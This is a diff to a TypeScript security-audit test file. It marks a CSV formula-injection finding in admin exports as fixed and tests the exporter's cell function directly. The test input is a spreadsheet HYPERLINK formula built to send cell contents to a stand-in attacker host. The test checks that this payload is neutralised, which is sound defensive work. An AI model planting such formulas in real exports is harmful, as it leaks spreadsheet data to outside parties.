@@ -1,9 +1,9 @@
 /// <reference types="node" />
 
-// Audit proofs for findings that are NOT fixed yet (docs/review/SECURITY_AUDIT.md: SEC-04,
-// SEC-05, SEC-07, SEC-09). Each asserts the SECURE behaviour and is marked `todo`, so it runs
-// and reports "# TODO" without failing `npm run test:rules`. When a finding is fixed, remove
-// its `todo` option: the test must then pass.
+// Audit proofs for findings (docs/review/SECURITY_AUDIT.md: SEC-04, SEC-05, SEC-07, SEC-09).
+// Each asserts the SECURE behaviour. Open findings are marked `todo`, so they run and report
+// "# TODO" without failing `npm run test:rules`. When a finding is fixed, its `todo` option is
+// removed and the test must pass (SEC-09: fixed in Security batch B).
 // Self-contained on purpose: Node's type stripping does not resolve the "@/..." aliases.
 
 import assert from 'node:assert/strict';
@@ -25,6 +25,8 @@ import {
   type DocumentData,
   type Firestore,
 } from 'firebase/firestore';
+
+import { csvCell } from '../../../admin/src/lib/csv.ts';
 
 setLogLevel('error');
 
@@ -113,11 +115,8 @@ describe('SEC-07 payment reference oracle', () => {
 });
 
 describe('SEC-09 CSV formula injection (admin exports)', () => {
-  it('a formula in a driver name is exported inert', { todo: 'SEC-09 open: prefix formula cells' }, () => {
-    const source = readFileSync('admin/src/reports/reportMath.ts', 'utf8');
-    const body = /function csvCell\(value: string \| number\): string \{([\s\S]*?)\n\}/.exec(source)?.[1];
-    assert.ok(body, 'csvCell not found');
-    const csvCell = new Function('value', body) as (value: string | number) => string;
+  // Fixed (Security batch B): csvCell now lives in admin/src/lib/csv.ts and prefixes ' .
+  it('a formula in a driver name is exported inert', () => {
     const cell = csvCell('=HYPERLINK("http://evil.example/?x="&A1,"Pedro")');
     assert.ok(!/^[=+\-@]/.test(cell.replace(/^"/, '')), `exported as ${cell}`);
   });
